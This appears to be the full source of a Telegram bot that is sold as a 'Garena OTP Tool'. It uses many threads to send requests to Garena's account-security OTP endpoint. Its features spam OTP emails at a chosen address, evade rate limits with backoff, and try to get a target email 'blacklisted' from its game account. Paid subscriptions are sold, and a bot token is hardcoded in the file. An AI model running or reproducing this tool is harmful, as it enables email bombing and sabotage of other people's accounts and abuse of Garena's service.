# Dependencies: pip install pyTelegramBotAPI requests urllib3

import os
import sys
import time
import json
import random
import threading
import requests
import urllib3
from datetime import datetime, date
from telebot import TeleBot, types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "9150929013:AAE3Qt2JSifrUmz99MBg0LlT9pyVo4GVgpI")
OWNER_ID = int(os.getenv("OWNER_ID", "6863389453"))

DB_FILE = os.getenv("DB_FILE", "users.json")
OTP_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
BASE_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "Accept": "application/json",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

MAXOTP_DURATION = 60
NUM_WORKERS_MAXOTP = 50
MAXOTP_PAUSE_THRESHOLD = 30
MAXOTP_PAUSE_SECONDS = 2.0

BLACKLIST_WORKERS = 30
BLACKLIST_MIN_WORKERS = 6
BLACKLIST_RATE_RETRIES = 8
BLACKLIST_RATE_SLEEP = 2.0
BLACKLIST_GLOBAL_RL_THRESHOLD = 60
BLACKLIST_MAX_DURATION = 120

# ==================== DB ====================
_db_lock = threading.Lock()

def _load_db() -> dict:
    if not os.path.exists(DB_FILE):
        return {"users": {}, "banned": [], "subscribed": []}
    try:
        with open(DB_FILE, "r", encoding="utf-8") as f:
            db = json.load(f)
        db.setdefault("users", {})
        db.setdefault("banned", [])
        db.setdefault("subscribed", [])
        return db
    except Exception:
        return {"users": {}, "banned": [], "subscribed": []}

def _save_db(db: dict) -> None:
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2)

def get_user(uid: int) -> dict:
    with _db_lock:
        db = _load_db()
        key = str(uid)
        if key not in db["users"]:
            db["users"][key] = {"used_date": "", "total_uses": 0, "joined": datetime.now().isoformat()}
            _save_db(db)
        return db["users"][key]

def update_user(uid: int, **kwargs) -> None:
    with _db_lock:
        db = _load_db()
        key = str(uid)
        if key not in db["users"]:
            db["users"][key] = {"used_date": "", "total_uses": 0, "joined": datetime.now().isoformat()}
        db["users"][key].update(kwargs)
        _save_db(db)

def is_banned(uid: int) -> bool:
    with _db_lock:
        db = _load_db()
        return str(uid) in db.get("banned", [])

def ban_user(uid: int) -> None:
    with _db_lock:
        db = _load_db()
        if str(uid) not in db["banned"]:
            db["banned"].append(str(uid))
            _save_db(db)

def unban_user(uid: int) -> None:
    with _db_lock:
        db = _load_db()
        if str(uid) in db["banned"]:
            db["banned"].remove(str(uid))
            _save_db(db)

def reset_user(uid: int) -> None:
    update_user(uid, used_date="")

# -------- SUBSCRIPTION --------
def is_subscribed(uid: int) -> bool:
    if uid == OWNER_ID:
        return True
    with _db_lock:
        db = _load_db()
        return str(uid) in db.get("subscribed", [])

def subscribe_user(uid: int) -> bool:
    with _db_lock:
        db = _load_db()
        if str(uid) in db["subscribed"]:
            return False
        db["subscribed"].append(str(uid))
        _save_db(db)
        return True

def unsubscribe_user(uid: int) -> bool:
    with _db_lock:
        db = _load_db()
        if str(uid) in db["subscribed"]:
            db["subscribed"].remove(str(uid))
            _save_db(db)
            return True
        return False

def get_subscribed_list() -> list:
    with _db_lock:
        db = _load_db()
        return list(db.get("subscribed", []))

# -------- PERMISSION --------
def is_owner(uid: int) -> bool:
    return uid == OWNER_ID

def can_use_blacklist(uid: int) -> bool:
    """Owner = unlimited. Subscribed = unlimited blacklist. Free = 1/day (only blacklist)."""
    if is_owner(uid) or is_subscribed(uid):
        return True
    u = get_user(uid)
    return u.get("used_date", "") != date.today().isoformat()

def mark_blacklist_used(uid: int) -> None:
    if is_owner(uid) or is_subscribed(uid):
        u = get_user(uid)
        update_user(uid, total_uses=u.get("total_uses", 0) + 1)
        return
    u = get_user(uid)
    update_user(uid, used_date=date.today().isoformat(), total_uses=u.get("total_uses", 0) + 1)

# ==================== OTP ENGINE ====================
_thread_local = threading.local()

def _get_session() -> requests.Session:
    s = getattr(_thread_local, "session", None)
    if s is None:
        s = requests.Session()
        a = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0)
        s.mount("https://", a)
        s.mount("http://", a)
        _thread_local.session = s
    return s

def classify_response(j: dict, exc: str | None) -> str:
    if exc is not None:
        low = exc.lower()
        if "timed out" in low or "connection" in low or "proxy" in low or "reset" in low:
            return "ip_block"
        return "error"

    err = j.get("error")
    code = j.get("code")
    res = j.get("result")

    if res == 0:
        return "success"
    if err == "error_too_many_requests" or code == 1006:
        return "ip_block"
    if err == "error_no_binding_found":
        return "already_blacklisted"
    if err == "error_params":
        return "wrong_email"
    return "error"

def send_single_otp(email: str) -> dict:
    s = _get_session()
    data = {"app_id": "100067", "email": email, "locale": "hi_IN"}
    exc_msg = None
    j = {}
    try:
        r = s.post(OTP_URL, headers=BASE_HEADERS, data=data, timeout=10, verify=False)
        try:
            j = r.json()
        except Exception:
            j = {}
    except Exception as e:
        exc_msg = str(e)
    status = classify_response(j, exc_msg)
    return {"sent_to": email, "original": email, "response": j, "status": status}

def max_otp_blast(email: str, duration: int, workers: int, progress_cb=None) -> dict:
    hits = 0
    rl = 0
    already = 0
    wrong = 0
    lock = threading.Lock()
    stop_event = threading.Event()
    stop_time = time.time() + duration
    recent_rl = [0]
    rl_lock = threading.Lock()

    def worker():
        nonlocal hits, rl, already, wrong
        s = _get_session()
        while not stop_event.is_set() and time.time() < stop_time:
            with rl_lock:
                pressure = recent_rl[0]
            if pressure >= MAXOTP_PAUSE_THRESHOLD:
                time.sleep(MAXOTP_PAUSE_SECONDS)
                with rl_lock:
                    recent_rl[0] = 0
            data = {"app_id": "100067", "email": email, "locale": "hi_IN"}
            try:
                r = s.post(OTP_URL, headers=BASE_HEADERS, data=data, timeout=8, verify=False)
                try:
                    j = r.json()
                except Exception:
                    j = {}
                st = classify_response(j, None)
                if st == "success":
                    with rl_lock:
                        recent_rl[0] = max(0, recent_rl[0] - 1)
                    with lock:
                        hits += 1
                elif st == "ip_block":
                    with lock:
                        rl += 1
                    with rl_lock:
                        recent_rl[0] += 1
                elif st == "already_blacklisted":
                    with lock:
                        already += 1
                elif st == "wrong_email":
                    with lock:
                        wrong += 1
            except Exception:
                with lock:
                    rl += 1
                with rl_lock:
                    recent_rl[0] += 1

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()
    last_update = 0.0
    while time.time() < stop_time and not stop_event.is_set():
        time.sleep(0.5)
        now = time.time()
        if progress_cb and now - last_update >= 5:
            with lock:
                progress_cb(hits, rl, int(stop_time - now))
            last_update = now
    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    if hits > 0:
        final = "success"
    elif already > 0:
        final = "already_blacklisted"
    elif wrong > 0:
        final = "wrong_email"
    elif rl > 0:
        final = "ip_block"
    else:
        final = "error"

    return {
        "hits": hits,
        "rate_limited": rl,
        "already": already,
        "wrong": wrong,
        "duration": duration,
        "final": final,
    }

# ---------- BLACKLIST ENGINE ----------
def blacklist_verify(email: str, progress_cb=None) -> dict:
    hits = 0
    rl_total = 0
    lock = threading.Lock()
    stop_event = threading.Event()
    start_time = time.time()
    recent_rl = [0]
    rl_lock = threading.Lock()
    result_flag = {"status": None}

    def worker():
        nonlocal hits, rl_total
        s = _get_session()
        local_rl = 0
        while not stop_event.is_set():
            if time.time() - start_time >= BLACKLIST_MAX_DURATION:
                return
            with rl_lock:
                pressure = recent_rl[0]
            if pressure >= 5:
                time.sleep(0.5)

            data = {"app_id": "100067", "email": email, "locale": "hi_IN"}
            try:
                r = s.post(OTP_URL, headers=BASE_HEADERS, data=data, timeout=10, verify=False)
                try:
                    j = r.json()
                except Exception:
                    j = {}
            except Exception:
                time.sleep(0.2)
                continue

            err = j.get("error")
            code = j.get("code")
            res = j.get("result")

            if res == 0:
                local_rl = 0
                with lock:
                    hits += 1
                with rl_lock:
                    recent_rl[0] = max(0, recent_rl[0] - 1)
                with lock:
                    total_rl_now = rl_total
                if total_rl_now >= BLACKLIST_GLOBAL_RL_THRESHOLD:
                    with lock:
                        if result_flag["status"] is None:
                            result_flag["status"] = "success"
                    stop_event.set()
                    return
                time.sleep(0.1)
                continue

            if err == "error_too_many_requests" or code == 1006:
                local_rl += 1
                with lock:
                    rl_total += 1
                with rl_lock:
                    recent_rl[0] += 1
                if local_rl >= BLACKLIST_RATE_RETRIES:
                    return
                time.sleep(BLACKLIST_RATE_SLEEP)
                continue

            if err == "error_no_binding_found":
                with lock:
                    if result_flag["status"] is None:
                        result_flag["status"] = "already_blacklisted"
                stop_event.set()
                return

            if err == "error_params":
                with lock:
                    if result_flag["status"] is None:
                        result_flag["status"] = "wrong_email"
                stop_event.set()
                return

            time.sleep(0.05)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(BLACKLIST_WORKERS)]
    for t in threads:
        t.start()

    last_update = 0.0
    while not stop_event.is_set() and time.time() - start_time < BLACKLIST_MAX_DURATION:
        time.sleep(0.3)
        now = time.time()
        if progress_cb and now - last_update >= 4:
            with lock:
                progress_cb(hits, rl_total, int(BLACKLIST_MAX_DURATION - (now - start_time)))
            last_update = now

    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    final = result_flag["status"]
    if final is None:
        if hits > 0:
            final = "success"
        elif rl_total > 0:
            final = "ip_block"
        else:
            final = "error"

    return {
        "hits": hits,
        "rate_limited": rl_total,
        "final": final,
        "duration": int(time.time() - start_time),
    }

# ==================== BOT ====================
print("🤖 Initializing bot...", flush=True)
bot = TeleBot(BOT_TOKEN, parse_mode="HTML")
_active = {}

STATUS_EMOJI = {
    "success": "✅",
    "ip_block": "🛑",
    "already_blacklisted": "⚠️",
    "wrong_email": "❌",
    "error": "❓",
}
STATUS_TEXT = {
    "success": "SUCCESS",
    "ip_block": "IP BLOCK ISSUE",
    "already_blacklisted": "ALREADY BLACKLISTED",
    "wrong_email": "WRONG EMAIL",
    "error": "UNKNOWN ERROR",
}

def main_menu_kb(uid: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📧 Single OTP", callback_data="menu_single"),
        types.InlineKeyboardButton("💣 Max OTP Blast", callback_data="menu_blast"),
    )
    kb.add(types.InlineKeyboardButton("🚫 Blacklist Email", callback_data="menu_blacklist"))
    kb.add(types.InlineKeyboardButton("👤 My Stats", callback_data="menu_stats"))
    if uid == OWNER_ID:
        kb.add(types.InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel"))
    kb.add(types.InlineKeyboardButton("ℹ️ Help", callback_data="menu_help"))
    return kb

def owner_kb() -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📊 Bot Stats", callback_data="own_stats"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="own_broadcast"),
    )
    kb.add(
        types.InlineKeyboardButton("🚫 Ban User", callback_data="own_ban"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="own_unban"),
    )
    kb.add(
        types.InlineKeyboardButton("🔄 Reset User", callback_data="own_reset"),
        types.InlineKeyboardButton("📋 List Users", callback_data="own_list"),
    )
    kb.add(
        types.InlineKeyboardButton("⭐ Subscribe User", callback_data="own_sub"),
        types.InlineKeyboardButton("🚫 Unsubscribe", callback_data="own_unsub"),
    )
    kb.add(types.InlineKeyboardButton("⭐ Subscribed List", callback_data="own_sublist"))
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb

def back_kb() -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb

@bot.message_handler(commands=["start"])
def cmd_start(msg: types.Message) -> None:
    uid = msg.from_user.id
    if is_banned(uid):
        bot.reply_to(msg, "🚫 <b>You are banned from using this bot.</b>")
        return
    get_user(uid)
    name = msg.from_user.first_name or "User"
    if is_owner(uid):
        sub_badge = "👑 <b>OWNER</b> — Unlimited Everything\n"
    elif is_subscribed(uid):
        sub_badge = "⭐ <b>SUBSCRIBED</b> — Unlimited Blacklist Only\n"
    else:
        sub_badge = "⏰ <b>Free users:</b> 1 Blacklist use / day\n"
    text = (
        f"🌟 <b>Hello {name}!</b>\n\n"
        f"🎯 <b>Garena OTP Tool</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📧 Single OTP sender\n"
        f"💣 Max OTP blaster\n"
        f"🚫 Email blacklist checker\n"
        f"{sub_badge}"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👇 <b>Select an option:</b>"
    )
    bot.send_message(uid, text, reply_markup=main_menu_kb(uid))

@bot.callback_query_handler(func=lambda c: True)
def cb_handler(call: types.CallbackQuery) -> None:
    uid = call.from_user.id
    data = call.data
    if is_banned(uid) and uid != OWNER_ID:
        bot.answer_callback_query(call.id, "🚫 You are banned.", show_alert=True)
        return

    if data == "menu_back":
        bot.edit_message_text(
            "🏠 <b>Main Menu</b>\n\n👇 Select an option:",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu_kb(uid),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "menu_stats":
        u = get_user(uid)
        if is_owner(uid):
            sub_text = "👑 Owner — Unlimited Everything"
            today_status = "✅ Unlimited"
        elif is_subscribed(uid):
            sub_text = "⭐ Subscribed — Unlimited Blacklist"
            today_status = "✅ Unlimited Blacklist"
        else:
            sub_text = "❌ Free — 1 Blacklist/day"
            today_status = "✅ Available" if can_use_blacklist(uid) else "❌ Used"
        text = (
            f"👤 <b>Your Stats</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: <code>{uid}</code>\n"
            f"📅 Last used: <b>{u.get('used_date') or 'Never'}</b>\n"
            f"🔢 Total uses: <b>{u.get('total_uses', 0)}</b>\n"
            f"⭐ Status: <b>{sub_text}</b>\n"
            f"⏰ Today: <b>{today_status}</b>"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=back_kb())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_help":
        text = (
            "ℹ️ <b>Help</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📧 <b>Single OTP:</b> sends 1 OTP (Owner only)\n"
            "💣 <b>Max OTP Blast:</b> spams OTP 60s (Owner only)\n"
            "🚫 <b>Blacklist:</b> attempts to blacklist email\n"
            "⭐ <b>Subscribed users:</b> Unlimited Blacklist\n"
            "⏰ <b>Free users:</b> 1 Blacklist use/day\n"
            "👑 Owner has unlimited access to all\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "💳 <b>Want subscription?</b>\n"
            "DM <b>@CURRENTTTTTTTT</b>"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=back_kb())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_single":
        if not is_owner(uid):
            bot.answer_callback_query(
                call.id,
                "❌ You are not authorised for this.\n⭐ Want subscription? DM @CURRENTTTTTTTT",
                show_alert=True,
            )
            return
        _active[uid] = "await_single"
        bot.edit_message_text(
            "📧 <b>Single OTP</b>\n\n✉️ Send me the email address:",
            call.message.chat.id, call.message.message_id,
            reply_markup=back_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "menu_blast":
        if not is_owner(uid):
            bot.answer_callback_query(
                call.id,
                "❌ You are not authorised for this.\n⭐ Want subscription? DM @CURRENTTTTTTTT",
                show_alert=True,
            )
            return
        _active[uid] = "await_blast"
        bot.edit_message_text(
            "💣 <b>Max OTP Blast</b>\n\n✉️ Send me the email address:\n"
            f"⏱ Duration: <b>{MAXOTP_DURATION}s</b> | Workers: <b>{NUM_WORKERS_MAXOTP}</b>",
            call.message.chat.id, call.message.message_id,
            reply_markup=back_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "menu_blacklist":
        if not can_use_blacklist(uid):
            bot.answer_callback_query(
                call.id,
                "⏰ Daily limit reached! Try tomorrow.\n⭐ Want subscription? DM @CURRENTTTTTTTT",
                show_alert=True,
            )
            return
        _active[uid] = "await_blacklist"
        bot.edit_message_text(
            "🚫 <b>Email Blacklist</b>\n\n✉️ Send me the email address to blacklist:\n"
            f"⏱ Max duration: <b>{BLACKLIST_MAX_DURATION}s</b> | Workers: <b>{BLACKLIST_WORKERS}</b>",
            call.message.chat.id, call.message.message_id,
            reply_markup=back_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if uid != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ Owner only.", show_alert=True)
        return

    if data == "owner_panel":
        bot.edit_message_text(
            "👑 <b>Owner Panel</b>\n\n👇 Select an action:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_stats":
        db = _load_db()
        total_users = len(db["users"])
        total_uses = sum(u.get("total_uses", 0) for u in db["users"].values())
        banned = len(db.get("banned", []))
        subs = len(db.get("subscribed", []))
        active_today = sum(1 for u in db["users"].values() if u.get("used_date") == date.today().isoformat())
        text = (
            f"📊 <b>Bot Statistics</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total users: <b>{total_users}</b>\n"
            f"⭐ Subscribed: <b>{subs}</b>\n"
            f"🔢 Total uses: <b>{total_uses}</b>\n"
            f"📅 Active today: <b>{active_today}</b>\n"
            f"🚫 Banned: <b>{banned}</b>"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=owner_kb())
        bot.answer_callback_query(call.id)
        return

    if data == "own_broadcast":
        _active[uid] = "await_broadcast"
        bot.edit_message_text(
            "📢 <b>Broadcast</b>\n\nSend the message to broadcast to all users:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_ban":
        _active[uid] = "await_ban"
        bot.edit_message_text(
            "🚫 <b>Ban User</b>\n\nSend the user ID:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_unban":
        _active[uid] = "await_unban"
        bot.edit_message_text(
            "✅ <b>Unban User</b>\n\nSend the user ID:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_reset":
        _active[uid] = "await_reset"
        bot.edit_message_text(
            "🔄 <b>Reset User</b>\n\nSend the user ID to reset daily limit:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_list":
        db = _load_db()
        lines = []
        for k, v in list(db["users"].items())[:50]:
            lines.append(f"• <code>{k}</code> — uses: {v.get('total_uses', 0)} | last: {v.get('used_date') or '-'}")
        text = "📋 <b>Users (first 50)</b>\n━━━━━━━━━━━━━━━━━━\n" + ("\n".join(lines) if lines else "No users yet.")
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=owner_kb())
        bot.answer_callback_query(call.id)
        return

    if data == "own_sub":
        _active[uid] = "await_sub"
        bot.edit_message_text(
            "⭐ <b>Subscribe User</b>\n\nSend the user ID to grant unlimited Blacklist access:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_unsub":
        _active[uid] = "await_unsub"
        bot.edit_message_text(
            "🚫 <b>Unsubscribe User</b>\n\nSend the user ID to remove subscription:",
            call.message.chat.id, call.message.message_id,
            reply_markup=owner_kb(),
        )
        bot.answer_callback_query(call.id)
        return

    if data == "own_sublist":
        subs = get_subscribed_list()
        lines = []
        for k in subs[:50]:
            lines.append(f"⭐ <code>{k}</code>")
        text = "⭐ <b>Subscribed Users</b>\n━━━━━━━━━━━━━━━━━━\n" + ("\n".join(lines) if lines else "No subscribed users.")
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=owner_kb())
        bot.answer_callback_query(call.id)
        return

    bot.answer_callback_query(call.id)

def format_result(status: str, email: str, extra: str = "") -> str:
    emoji = STATUS_EMOJI.get(status, "❓")
    label = STATUS_TEXT.get(status, "UNKNOWN")
    body = f"{emoji} <b>{label}</b>\n📧 <code>{email}</code>"
    if extra:
        body += f"\n{extra}"
    return body

@bot.message_handler(func=lambda m: m.from_user.id in _active)
def handle_input(msg: types.Message) -> None:
    uid = msg.from_user.id
    action = _active.get(uid)
    if action is None:
        return
    text = (msg.text or "").strip()

    if action == "await_single":
        _active.pop(uid, None)
        if "@" not in text:
            bot.reply_to(msg, "❌ Invalid email format.")
            return
        if not is_owner(uid):
            bot.reply_to(msg, "❌ You are not authorised for this.\n⭐ Want subscription? DM @CURRENTTTTTTTT")
            return
        status_msg = bot.reply_to(msg, "⏳ Processing...")
        res = send_single_otp(text)
        st = res["status"]
        if st == "success":
            u = get_user(uid)
            update_user(uid, total_uses=u.get("total_uses", 0) + 1)
        bot.edit_message_text(
            format_result(st, res["sent_to"]),
            status_msg.chat.id, status_msg.message_id,
        )
        return

    if action == "await_blast":
        _active.pop(uid, None)
        if "@" not in text:
            bot.reply_to(msg, "❌ Invalid email format.")
            return
        if not is_owner(uid):
            bot.reply_to(msg, "❌ You are not authorised for this.\n⭐ Want subscription? DM @CURRENTTTTTTTT")
            return
        status_msg = bot.reply_to(msg, f"💣 Blasting OTP for {MAXOTP_DURATION}s...")
        def progress(h, r, left):
            try:
                bot.edit_message_text(
                    f"💣 <b>Blasting...</b>\n"
                    f"✅ Hits: <b>{h}</b>\n"
                    f"🛑 IP Block/RL: <b>{r}</b>\n"
                    f"⏱ Left: <b>{left}s</b>",
                    status_msg.chat.id, status_msg.message_id,
                )
            except Exception:
                pass
        result = max_otp_blast(text, MAXOTP_DURATION, NUM_WORKERS_MAXOTP, progress_cb=progress)
        final = result["final"]
        if final == "success":
            u = get_user(uid)
            update_user(uid, total_uses=u.get("total_uses", 0) + 1)
        total = result["hits"] + result["rate_limited"]
        pct = (result["hits"] / total * 100) if total > 0 else 0.0
        extra = (
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ OTPs sent: <b>{result['hits']}</b>\n"
            f"🛑 IP Block/RL: <b>{result['rate_limited']}</b>\n"
            f"⚠️ Already BL: <b>{result['already']}</b>\n"
            f"❌ Wrong email: <b>{result['wrong']}</b>\n"
            f"📊 Success: <b>{pct:.1f}%</b>"
        )
        bot.edit_message_text(
            format_result(final, text, extra),
            status_msg.chat.id, status_msg.message_id,
        )
        return

    if action == "await_blacklist":
        _active.pop(uid, None)
        if "@" not in text:
            bot.reply_to(msg, "❌ Invalid email format.")
            return
        if not can_use_blacklist(uid):
            bot.reply_to(msg, "⏰ Daily limit reached!\n⭐ Want subscription? DM @CURRENTTTTTTTT")
            return
        status_msg = bot.reply_to(msg, f"🚫 Blacklisting for max {BLACKLIST_MAX_DURATION}s...")
        def progress_bl(h, r, left):
            try:
                bot.edit_message_text(
                    f"🚫 <b>Blacklisting...</b>\n"
                    f"✅ Hits: <b>{h}</b>\n"
                    f"🛑 Rate limits: <b>{r}</b>\n"
                    f"⏱ Left: <b>{left}s</b>",
                    status_msg.chat.id, status_msg.message_id,
                )
            except Exception:
                pass
        result = blacklist_verify(text, progress_cb=progress_bl)
        final = result["final"]
        if final == "success":
            mark_blacklist_used(uid)
        extra = (
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ OTPs sent: <b>{result['hits']}</b>\n"
            f"🛑 Rate limits: <b>{result['rate_limited']}</b>\n"
            f"⏱ Duration: <b>{result['duration']}s</b>"
        )
        bot.edit_message_text(
            format_result(final, text, extra),
            status_msg.chat.id, status_msg.message_id,
        )
        return

    if action == "await_broadcast" and uid == OWNER_ID:
        _active.pop(uid, None)
        db = _load_db()
        sent = 0
        failed = 0
        for k in db["users"].keys():
            try:
                bot.send_message(int(k), f"📢 <b>Broadcast</b>\n\n{text}")
                sent += 1
            except Exception:
                failed += 1
        bot.reply_to(msg, f"📢 Broadcast done.\n✅ Sent: {sent}\n❌ Failed: {failed}")
        return

    if action == "await_ban" and uid == OWNER_ID:
        _active.pop(uid, None)
        try:
            target = int(text)
            ban_user(target)
            bot.reply_to(msg, f"🚫 Banned <code>{target}</code>")
        except ValueError:
            bot.reply_to(msg, "❌ Invalid user ID.")
        return

    if action == "await_unban" and uid == OWNER_ID:
        _active.pop(uid, None)
        try:
            target = int(text)
            unban_user(target)
            bot.reply_to(msg, f"✅ Unbanned <code>{target}</code>")
        except ValueError:
            bot.reply_to(msg, "❌ Invalid user ID.")
        return

    if action == "await_reset" and uid == OWNER_ID:
        _active.pop(uid, None)
        try:
            target = int(text)
            reset_user(target)
            bot.reply_to(msg, f"🔄 Reset daily limit for <code>{target}</code>")
        except ValueError:
            bot.reply_to(msg, "❌ Invalid user ID.")
        return

    if action == "await_sub" and uid == OWNER_ID:
        _active.pop(uid, None)
        try:
            target = int(text)
            added = subscribe_user(target)
            if added:
                bot.reply_to(msg, f"⭐ Subscribed <code>{target}</code> — unlimited Blacklist access granted.")
                try:
                    bot.send_message(target, "⭐ <b>You have been subscribed!</b>\n\nNow you have <b>unlimited</b> access to the <b>Blacklist</b> command.")
                except Exception:
                    pass
            else:
                bot.reply_to(msg, f"ℹ️ <code>{target}</code> is already subscribed.")
        except ValueError:
            bot.reply_to(msg, "❌ Invalid user ID.")
        return

    if action == "await_unsub" and uid == OWNER_ID:
        _active.pop(uid, None)
        try:
            target = int(text)
            removed = unsubscribe_user(target)
            if removed:
                bot.reply_to(msg, f"🚫 Unsubscribed <code>{target}</code>.")
            else:
                bot.reply_to(msg, f"ℹ️ <code>{target}</code> was not subscribed.")
        except ValueError:
            bot.reply_to(msg, "❌ Invalid user ID.")
        return

def run() -> None:
    print("🤖 Bot starting...", flush=True)
    try:
        me = bot.get_me()
        print(f"✅ Logged in as @{me.username} (ID: {me.id})", flush=True)
        print(f"👑 Owner ID: {OWNER_ID}", flush=True)
        print("🔄 Polling started...", flush=True)
    except Exception as e:
        print(f"❌ get_me failed: {e}", flush=True)
        sys.exit(1)
    bot.infinity_polling(timeout=30, long_polling_timeout=30)

if __name__ == "__main__":
    run()
